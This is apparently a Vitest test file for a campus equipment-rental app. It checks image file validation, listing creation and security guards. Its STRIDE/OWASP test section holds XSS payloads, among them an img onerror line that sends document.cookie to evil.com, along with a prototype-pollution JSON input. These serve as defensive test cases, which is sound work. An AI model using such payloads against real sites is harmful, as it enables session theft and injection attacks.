import { describe, it, expect } from 'vitest';
import {
  validateImageFile,
  createProductListing,
  type ProductListingInput
} from '../lib/fileValidation';
import type { CampusUser } from '../types/campus';

describe('Native File Picker Product Listing Pipeline', () => {
  const mockUser: CampusUser = {
    id: 'user_priya_2024',
    name: 'Priya Sharma',
    rollNo: '21ECE042',
    department: 'Electronics & Communication',
    year: '3rd Year',
    hostel: 'Hostel 2 (Kalpana Chawla)',
    roomNo: 'B-304',
    trustScore: 98,
    isVerified: true,
    avatarUrl: 'https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=200&q=80',
    successfulExchanges: 14,
    lateReturns: 0,
    disputes: 0,
    walletBalancePaise: 450000,
    role: 'borrower'
  };

  describe('1. Native File Type & Format Restrictions (PNG, JPG, JPEG Only)', () => {
    it('accepts a valid PNG image file', () => {
      const validPng = {
        name: 'dslr_camera.png',
        type: 'image/png',
        size: 1024 * 500 // 500 KB
      };
      const result = validateImageFile(validPng);
      expect(result.isValid).toBe(true);
      expect(result.error).toBeUndefined();
    });

    it('accepts a valid JPG image file', () => {
      const validJpg = {
        name: 'scientific_calculator.jpg',
        type: 'image/jpeg',
        size: 1024 * 800 // 800 KB
      };
      const result = validateImageFile(validJpg);
      expect(result.isValid).toBe(true);
      expect(result.error).toBeUndefined();
    });

    it('accepts a valid JPEG image file (with uppercase extension)', () => {
      const validJpeg = {
        name: 'LAB_COAT.JPEG',
        type: 'image/jpeg',
        size: 1024 * 1200 // 1.2 MB
      };
      const result = validateImageFile(validJpeg);
      expect(result.isValid).toBe(true);
      expect(result.error).toBeUndefined();
    });

    it('accepts Windows file selection when MIME type is empty but extension is valid .jpg', () => {
      const winJpg = {
        name: 'camera_shot.jpg',
        type: '',
        size: 1024 * 600
      };
      const result = validateImageFile(winJpg);
      expect(result.isValid).toBe(true);
    });

    it('rejects GIF image files', () => {
      const gifFile = {
        name: 'animated_gear.gif',
        type: 'image/gif',
        size: 1024 * 200
      };
      const result = validateImageFile(gifFile);
      expect(result.isValid).toBe(false);
      expect(result.error).toMatch(/Only PNG, JPG, or JPEG/i);
    });

    it('rejects SVG vector files (XSS vector prevention)', () => {
      const svgFile = {
        name: 'vector_graphic.svg',
        type: 'image/svg+xml',
        size: 1024 * 50
      };
      const result = validateImageFile(svgFile);
      expect(result.isValid).toBe(false);
      expect(result.error).toMatch(/Only PNG, JPG, or JPEG/i);
    });

    it('rejects WEBP image files', () => {
      const webpFile = {
        name: 'photo.webp',
        type: 'image/webp',
        size: 1024 * 300
      };
      const result = validateImageFile(webpFile);
      expect(result.isValid).toBe(false);
      expect(result.error).toMatch(/Only PNG, JPG, or JPEG/i);
    });

    it('rejects non-image documents and executables (PDF, EXE, SH)', () => {
      const pdfFile = {
        name: 'assignment.pdf',
        type: 'application/pdf',
        size: 1024 * 500
      };
      expect(validateImageFile(pdfFile).isValid).toBe(false);

      const exeFile = {
        name: 'malware.exe',
        type: 'application/x-msdownload',
        size: 1024 * 100
      };
      expect(validateImageFile(exeFile).isValid).toBe(false);
    });

    it('rejects files with mismatched extension and MIME type spoofing', () => {
      const spoofedFile = {
        name: 'script.exe.png',
        type: 'application/octet-stream',
        size: 1024 * 10
      };
      const result = validateImageFile(spoofedFile);
      expect(result.isValid).toBe(false);
    });
  });

  describe('2. File Size & DoS Guardrails', () => {
    it('accepts files under the 5MB limit', () => {
      const normalFile = {
        name: 'camera.jpg',
        type: 'image/jpeg',
        size: 4.8 * 1024 * 1024 // 4.8 MB
      };
      expect(validateImageFile(normalFile).isValid).toBe(true);
    });

    it('rejects files exceeding the 5MB limit', () => {
      const hugeFile = {
        name: 'huge_raw_photo.jpg',
        type: 'image/jpeg',
        size: 5.5 * 1024 * 1024 // 5.5 MB
      };
      const result = validateImageFile(hugeFile);
      expect(result.isValid).toBe(false);
      expect(result.error).toMatch(/5MB/i);
    });

    it('rejects 0-byte or corrupted empty files', () => {
      const emptyFile = {
        name: 'empty.png',
        type: 'image/png',
        size: 0
      };
      const result = validateImageFile(emptyFile);
      expect(result.isValid).toBe(false);
      expect(result.error).toMatch(/empty/i);
    });
  });

  describe('3. Product Listing Creation & State Binding', () => {
    it('creates a complete CampusResource with the user-selected image', () => {
      const input: ProductListingInput = {
        title: 'Sony Alpha A7 III Mirrorless Camera',
        category: 'Media & Events',
        description: 'Full frame 4K video recording with 28-70mm lens kit.',
        hourlyRate: '120',
        deposit: '800',
        condition: 'Excellent',
        isDonation: false,
        accessories: 'Battery, 64GB SD Card, Carry Bag',
        imageUrl: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD...'
      };

      const resource = createProductListing(input, mockUser);

      expect(resource.id).toMatch(/^res_user_\d+/);
      expect(resource.title).toBe('Sony Alpha A7 III Mirrorless Camera');
      expect(resource.category).toBe('Media & Events');
      expect(resource.description).toBe('Full frame 4K video recording with 28-70mm lens kit.');
      expect(resource.hourlyRateRupees).toBe(120);
      expect(resource.depositRupees).toBe(800);
      expect(resource.imageUrl).toBe(input.imageUrl);
      expect(resource.ownerId).toBe(mockUser.id);
      expect(resource.ownerName).toBe(mockUser.name);
      expect(resource.ownerHostel).toBe(mockUser.hostel);
      expect(resource.accessoriesIncluded).toEqual(['Battery', '64GB SD Card', 'Carry Bag']);
      expect(resource.isAvailable).toBe(true);
      expect(resource.isDonation).toBe(false);
    });

    it('auto-infers title from product description if title is left empty', () => {
      const input: ProductListingInput = {
        title: '',
        category: 'Lab & Academic',
        description: 'Casio fx-991ES Plus scientific calculator for university engineering exams.',
        hourlyRate: '15',
        deposit: '100',
        condition: 'Excellent',
        isDonation: false,
        accessories: 'Cover',
        imageUrl: 'data:image/png;base64,...'
      };

      const resource = createProductListing(input, mockUser);
      expect(resource.title).toBeTruthy();
      expect(resource.title).toContain('Casio fx-991ES Plus');
    });

    it('enforces ₹0 fee and ₹0 deposit when Free/Donation is enabled', () => {
      const input: ProductListingInput = {
        title: 'Engineering Mathematics Textbook (Vol 1)',
        category: 'Lab & Academic',
        description: 'Passing on 1st year textbook to juniors for free.',
        hourlyRate: '50', // Attempted fee should be overridden to 0
        deposit: '200',  // Attempted deposit should be overridden to 0
        condition: 'Good',
        isDonation: true,
        accessories: 'Handwritten Formula Notes',
        imageUrl: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAAB...'
      };

      const resource = createProductListing(input, mockUser);

      expect(resource.category).toBe('Free / Donate');
      expect(resource.hourlyRateRupees).toBe(0);
      expect(resource.depositRupees).toBe(0);
      expect(resource.isDonation).toBe(true);
    });

    it('uses category fallback image if no custom image is supplied', () => {
      const input: ProductListingInput = {
        title: 'Lab Multimeter',
        category: 'Electronics',
        description: 'Digital multimeter for circuit design.',
        hourlyRate: '15',
        deposit: '50',
        condition: 'Good',
        isDonation: false,
        accessories: 'Probes',
        imageUrl: ''
      };

      const resource = createProductListing(input, mockUser);
      expect(resource.imageUrl).toMatch(/^https:\/\/images\.unsplash\.com/);
    });
  });

  describe('4. STRIDE Threat Model & OWASP Top 10 Security Tests', () => {
    it('STRIDE Spoofing: strictly binds owner attributes to active session user', () => {
      const input: ProductListingInput = {
        title: 'Arduino Mega 2560',
        category: 'Electronics',
        description: 'Microcontroller board for robotics.',
        hourlyRate: '20',
        deposit: '100',
        condition: 'Brand New',
        isDonation: false,
        accessories: 'USB Cable',
        imageUrl: 'data:image/png;base64,iVBORw0KGgoAAA...'
      };

      const resource = createProductListing(input, mockUser);

      expect(resource.ownerId).toBe('user_priya_2024');
      expect(resource.ownerName).toBe('Priya Sharma');
      expect(resource.ownerDepartment).toBe('Electronics & Communication');
    });

    it('STRIDE Tampering & OWASP A03 (Injection): sanitizes script and HTML payloads in text fields', () => {
      const maliciousInput: ProductListingInput = {
        title: '<script>alert("XSS")</script>Casio Calculator',
        category: 'Lab & Academic',
        description: '<img src=x onerror="fetch(\'http://evil.com/steal?c=\'+document.cookie)">Good condition',
        hourlyRate: '20',
        deposit: '100',
        condition: 'Good',
        isDonation: false,
        accessories: '<b onmouseover=alert(1)>Slide Cover</b>, Regular Case',
        imageUrl: 'data:image/jpeg;base64,/9j/4AAQSkZJRg...'
      };

      const resource = createProductListing(maliciousInput, mockUser);

      // Must not contain active script tags or onload/onerror attributes
      expect(resource.title).not.toContain('<script>');
      expect(resource.title).not.toContain('</script>');
      expect(resource.description).not.toContain('<img');
      expect(resource.description).not.toContain('onerror');
      expect(resource.accessoriesIncluded[0]).not.toContain('onmouseover');
    });

    it('STRIDE Elevation of Privilege: blocks prototype pollution via malicious input keys', () => {
      const pollutedInput = JSON.parse(
        '{"__proto__": {"isAdmin": true}, "title": "Test Gear", "category": "Electronics", "description": "Safe", "hourlyRate": "10", "deposit": "50", "condition": "Good", "isDonation": false, "accessories": "None", "imageUrl": "data:image/png;base64,..."}'
      );

      const resource = createProductListing(pollutedInput, mockUser);
      expect((Object.prototype as any).isAdmin).toBeUndefined();
      expect((resource as any).isAdmin).toBeUndefined();
    });

    it('STRIDE Denial of Service: safely handles very large description strings by truncating or sanitizing cleanly', () => {
      const longDescription = 'A'.repeat(5000);
      const input: ProductListingInput = {
        title: 'Long Desc Gear',
        category: 'Sports & Dorm',
        description: longDescription,
        hourlyRate: '10',
        deposit: '50',
        condition: 'Good',
        isDonation: false,
        accessories: 'Bag',
        imageUrl: 'data:image/jpeg;base64,...'
      };

      const resource = createProductListing(input, mockUser);
      expect(resource.description.length).toBeLessThanOrEqual(2000);
    });
  });
});
